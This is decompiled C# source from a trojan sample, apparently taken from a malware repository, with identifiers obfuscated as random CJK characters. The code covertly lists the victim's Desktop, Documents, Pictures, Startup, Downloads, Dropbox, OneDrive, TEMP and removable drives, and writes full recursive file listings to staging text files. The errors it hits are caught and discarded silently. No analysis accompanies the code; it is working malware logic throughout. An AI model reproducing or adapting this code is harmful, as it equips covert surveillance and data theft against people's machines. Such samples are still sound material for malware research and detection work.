// Decompiled with JetBrains decompiler
// Type: 見匚阜子攴方土石舛夂革心又.皮耳广靑巛犬鼎糸見走心
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace 見匚阜子攴方土石舛夂革心又
{
  internal sealed class 皮耳广靑巛犬鼎糸見走心
  {
    private static List<string> 己殳片木文廴戶广己穴囗 = new List<string>()
    {
      Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
      Environment.GetFolderPath(Environment.SpecialFolder.Personal),
      Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
      Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
      Environment.GetFolderPath(Environment.SpecialFolder.Startup),
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
      Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox"),
      Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "OneDrive"),
      Environment.GetEnvironmentVariable("TEMP")
    };

    private static string 入氏虍无入弋干鹵首冖白水黃(
      string 文月丿豆見寸魚耳隶耳比,
      string 巾山金爻心立米鬲爪馬弋鳥干 = "\t",
      int 方己巛儿骨矛大水爿釆 = -1,
      int 巛舛車高入人皿尸厶方子 = 0)
    {
      if (!Directory.Exists(文月丿豆見寸魚耳隶耳比))
        return "Directory not exists";
      DirectoryInfo directoryInfo = new DirectoryInfo(文月丿豆見寸魚耳隶耳比);
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine(string.Concat(Enumerable.Repeat<string>(巾山金爻心立米鬲爪馬弋鳥干, 巛舛車高入人皿尸厶方子)) + directoryInfo.Name + "\\");
      if (方己巛儿骨矛大水爿釆 == -1 || 方己巛儿骨矛大水爿釆 < 巛舛車高入人皿尸厶方子)
      {
        try
        {
          foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
          {
            try
            {
              stringBuilder.Append(皮耳广靑巛犬鼎糸見走心.入氏虍无入弋干鹵首冖白水黃(directory.FullName, 巾山金爻心立米鬲爪馬弋鳥干, 方己巛儿骨矛大水爿釆, 巛舛車高入人皿尸厶方子 + 1));
            }
            catch (UnauthorizedAccessException ex)
            {
            }
          }
        }
        catch (UnauthorizedAccessException ex)
        {
        }
      }
      try
      {
        foreach (FileInfo file in directoryInfo.GetFiles())
          stringBuilder.AppendLine(string.Concat(Enumerable.Repeat<string>(巾山金爻心立米鬲爪馬弋鳥干, 巛舛車高入人皿尸厶方子 + 1)) + file.Name);
      }
      catch (UnauthorizedAccessException ex)
      {
      }
      return stringBuilder.ToString();
    }

    private static string 辰黑入癶殳山匸香穴豆麥彳戶香儿(string 鹵山犬片巾黃十虍甘卩屮匚)
    {
      string name = new DirectoryInfo(鹵山犬片巾黃十虍甘卩屮匚).Name;
      return name.Length == 3 ? "DRIVE-" + name.Replace(":\\", "") : name;
    }

    public static void 力斤彳入木玄齊虍辰禾(string 欠二廾黑豸丨竹走比瓦囗鬲艸)
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.DriveType == DriveType.Removable && drive.IsReady)
          皮耳广靑巛犬鼎糸見走心.己殳片木文廴戶广己穴囗.Add(drive.RootDirectory.FullName);
      }
      foreach (string str1 in 皮耳广靑巛犬鼎糸見走心.己殳片木文廴戶广己穴囗)
      {
        try
        {
          string contents = 皮耳广靑巛犬鼎糸見走心.入氏虍无入弋干鹵首冖白水黃(str1);
          string str2 = 皮耳广靑巛犬鼎糸見走心.辰黑入癶殳山匸香穴豆麥彳戶香儿(str1);
          if (!contents.Contains("Directory not exists"))
            File.WriteAllText(Path.Combine(欠二廾黑豸丨竹走比瓦囗鬲艸, str2 + ".txt"), contents);
        }
        catch
        {
        }
      }
    }
  }
}
